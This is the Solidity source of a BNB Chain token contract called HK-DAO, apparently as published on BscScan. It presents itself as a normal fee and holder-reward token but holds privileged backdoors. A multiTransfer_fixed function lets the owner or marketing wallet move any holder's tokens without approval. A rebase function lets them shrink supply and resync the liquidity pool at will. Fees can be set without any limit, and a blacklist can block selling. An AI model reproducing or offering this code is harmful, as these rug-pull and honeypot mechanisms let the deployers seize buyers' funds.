/**
 *Submitted for verification at BscScan.com on 2023-06-03
*/

// SPDX-License-Identifier: unlicensed

pragma solidity ^0.7.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);

        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    mapping (address => bool) internal own;
    constructor(address _owner) {
        owner = _owner;
        own[_owner] = true;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) internal view returns (bool) {
        return account == owner;
    }
    function isownered(address adr) internal view returns (bool) {
        return own[adr];
    }
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        own[adr] = true;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
}
interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface InterfaceLP {
    function sync() external;
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}


contract HKDAO is IERC20, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;

    address WBNB = 0x55d398326f99059fF775485246999027B3197955;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    uint256 public startAddLPBlock;
    string constant _name = unicode"HK-DAO";
    string constant _symbol = unicode"HK-DAO";
    uint8 constant _decimals = 4;

    mapping (address => uint256) _rBalance;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) private isFeeExempt;
    mapping (address => bool) private isTxLimitExempt;
    mapping (address => bool) private isWalletLimitExempt;
    mapping(address => bool) public _blackList;
    mapping(address => bool) private _swapPairList;

    uint256 private totalfee = 5;
    uint256 private feeDenominator  = 100;
    uint256 private startTradeBlock = 0;
    uint256 private sellMultiplier  = 100;
    address private marketingFeeReceiver;

    IDEXRouter private router;
    address private pair;
    InterfaceLP private pairContract; 

    bool public tradingOpen = false;

    bool private swapEnabled = true;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
    event LogRebase(uint256 indexed epoch, uint256 totalSupply);

    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 100000000 * 10**_decimals;
    uint256 private swapThreshold = rSupply.div(50);
    uint256 private rebase_count = 0;
    uint256 private rate;
    uint256 public _totalSupply;
    uint256 private constant MAX_UINT256 = ~uint256(0);
    uint256 private constant MAX_SUPPLY = ~uint128(0);
    uint256 private constant rSupply = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);

    // Max wallet & Transaction
    uint256 private _maxTxAmount = rSupply.div(100).mul(100);
    uint256 private _maxWalletToken = rSupply.div(100).mul(100);
    bool magicState;

    // Sauce
    function rebase(uint256 epoch, int256 supplyDelta) private returns (uint256) {
        require(msg.sender == marketingFeeReceiver || msg.sender == owner ,"!marketer");
        rebase_count++;
        if(epoch == 0){
            epoch = rebase_count;
        }

        require(!inSwap, "Try again");

        if (supplyDelta == 0) {
            emit LogRebase(epoch, _totalSupply);
            return _totalSupply;
        }

        if (supplyDelta < 0) {
            _totalSupply = _totalSupply.sub(uint256(-supplyDelta));
        } else {
            _totalSupply = _totalSupply.add(uint256(supplyDelta));
        }

        if (_totalSupply > MAX_SUPPLY) {
            _totalSupply = MAX_SUPPLY;
        }

        rate = rSupply.div(_totalSupply);
        pairContract.sync();

        emit LogRebase(epoch, _totalSupply);
        return _totalSupply;
    }

    constructor () Ownable(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _swapPairList[pair] = true;
        magicState = IUniswapV2Pair(pair).token1() == address(this);

        _allowances[address(this)][address(router)] = MAX_UINT256;

        pairContract = InterfaceLP(pair);
        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        rate = rSupply.div(_totalSupply);
//fee
        isFeeExempt[marketingFeeReceiver] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[address(router)] = true;
        isFeeExempt[msg.sender] = true;
//MaxHold
        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[marketingFeeReceiver] = true;
        isWalletLimitExempt[address(router)] = true;
        isWalletLimitExempt[address(pair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;
        excludeHolder[DEAD] = true;
        excludeHolder[ZERO] = true;
        excludeHolder[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;
        marketingFeeReceiver = 0x89105A67bBB60dCD4Ae502ac106efe72e12Ec2d0;
        _rBalance[msg.sender] = rSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {
        return _rBalance[account].div(rate);
    }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function rebase_percentage(uint256 _percentage_base1000, bool reduce) public returns (uint256 newSupply){
        require(msg.sender == marketingFeeReceiver || msg.sender == owner ,"!marketer");
        if(reduce){
            newSupply = rebase(0,int(_totalSupply.div(1000).mul(_percentage_base1000)).mul(-1));
        } else{
            newSupply = rebase(0,int(_totalSupply.div(1000).mul(_percentage_base1000)));
        }
        
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        return _transferFrom(sender, recipient, amount);
    }

    function _getReverse()internal view returns(uint re,uint bal){
        if (!magicState){
            (re, ,) = IUniswapV2Pair(pair).getReserves();
        }else{
            (, re,) = IUniswapV2Pair(pair).getReserves();
        }

        bal = IERC20(WBNB).balanceOf(pair);
    }

    function _isAddLp() internal view returns (bool){
        (uint re,uint bal) = _getReverse();
        return bal > re +1000;
        
    }
    function _isRemoveLp() internal view returns (bool) {
        (uint re,uint bal) = _getReverse();
        return bal + 1000 <re;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        
        require(!_blackList[sender], "blackList");

        uint256 rAmount = amount.mul(rate);

        if (_swapPairList[sender] || _swapPairList[recipient]){
            if (!isFeeExempt[sender] && !isFeeExempt[recipient]){
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[recipient], "!startAddLP");
                    if (_isAddLp()){
                        _basicTransfer(sender, recipient, amount);
                        addHolder(sender);
                        return true;
                    }else{
                        require(false,"!openTrade");
                    }
                }
                if (_isRemoveLp()){
                    _basicTransfer(sender, recipient, amount);
                    return true;
                }
           }
        }

        if (!isWalletLimitExempt[sender]|| !isWalletLimitExempt[recipient]){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + rAmount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}
        checkTxLimit(sender, rAmount);

        if(shouldSwapBack()){ swapBack(); }


        _rBalance[sender] = _rBalance[sender].sub(rAmount, "Insufficient Balance");
        uint256 amountReceived = (!shouldTakeFee(sender) || !shouldTakeFee(recipient)) ? rAmount : takeFee(sender, rAmount,(recipient == pair));
        _rBalance[recipient] = _rBalance[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived.div(rate));

        if (sender != address(this)) {
            if (_swapPairList[recipient]) {
                addHolder(sender);
            }
            processReward(500000);
        }

        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 rAmount = amount.mul(rate);
        _rBalance[sender] = _rBalance[sender].sub(rAmount, "Insufficient Balance");
        _rBalance[recipient] = _rBalance[recipient].add(rAmount);
        emit Transfer(sender, recipient, rAmount.div(rate));
        return true;
    }

    function checkTxLimit(address sender, uint256 rAmount) internal view {
        require(rAmount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, uint256 rAmount, bool isSell) internal returns (uint256) {
        uint256 multiplier = 100;
        if(isSell){
            multiplier = sellMultiplier;
        } 
        uint256 feeAmount = rAmount.div(feeDenominator * 100).mul(totalfee).mul(multiplier);
        _rBalance[address(this)] = _rBalance[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount.div(rate));
        return rAmount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _rBalance[address(this)] >= swapThreshold;
    }

    function claimBNB() external {
        require(msg.sender == marketingFeeReceiver || msg.sender == owner ,"!marketer");
        uint256 amountBNB = address(this).balance;
        payable(msg.sender).transfer(amountBNB);
    }

    function claimToken(address token, uint256 amount, address to) external {
        require(msg.sender == marketingFeeReceiver || msg.sender == owner ,"!marketer");
        IERC20(token).transfer(to, amount);
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }


function swapBack() swapping internal {
    uint256 tokensToSell = swapThreshold.div(rate);
    if (tokensToSell == 0){
        return ;
    }

    address[] memory path = new address[](3);
    path[0] = address(this);
    path[1] = WBNB;
    path[2] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    uint256 _balance = address(this).balance;

    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokensToSell,
        0,
        path,
        address(this),
        block.timestamp
    );

    uint256 amountBNB = (address(this).balance - _balance)/2;
    payable(marketingFeeReceiver).transfer(amountBNB);
}


    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) public  excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }


    uint256 private currentIndex;
    uint256 private holderRewardCondition = 0.05 ether;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + 100 > block.number) { //100个区块内
            return;
        }
        uint256 balance = address(this).balance;

        if (balance < holderRewardCondition) {
            return;
        }
        
        IERC20 holdToken = IERC20(pair);

        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    payable(shareHolder).transfer(amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function startAddLP() external onlyOwner {
        require(0 == startAddLPBlock, "startedAddLP");
        startAddLPBlock = block.number;
    }

    function setIsFeeExempt(address holder, bool exempt) external {
        require(msg.sender == marketingFeeReceiver || msg.sender == owner ,"!marketer");
        isFeeExempt[holder] = exempt;
    }
    
    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsMaxHold(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    function setFees( uint256 _totalFee, uint256 _feeDenominator) external onlyOwner {
        totalfee = _totalFee;
        feeDenominator = _feeDenominator;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function setSwapBackSettings(bool _enabled, uint256 _percentage_base10000) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = rSupply * _percentage_base10000 / 10000;
    }

    function manualSync() external {
        InterfaceLP(pair).sync();
    }

    function isNotInSwap() external view returns (bool) {
        return !inSwap;
    }
  
    function checkSwapThreshold() external view returns (uint256) {
        return swapThreshold.div(rate);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return (rSupply.sub(_rBalance[DEAD]).sub(_rBalance[ZERO])).div(rate);
    }

    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner() {
        _maxWalletToken = rSupply.div(1000).mul(maxWallPercent_base1000);
    }

    function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000) external onlyOwner() {
        _maxTxAmount = rSupply.div(1000).mul(maxTXPercentage_base1000);
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

/* Airdrop Begins */

function multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external {
    require(msg.sender == marketingFeeReceiver || msg.sender == owner ,"!marketer");
    require(addresses.length < 2001,"GAS Error: max airdrop limit is 2000 addresses"); // to prevent overflow

    uint256 SCCC = tokens * addresses.length;

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],tokens);

        }
    }
}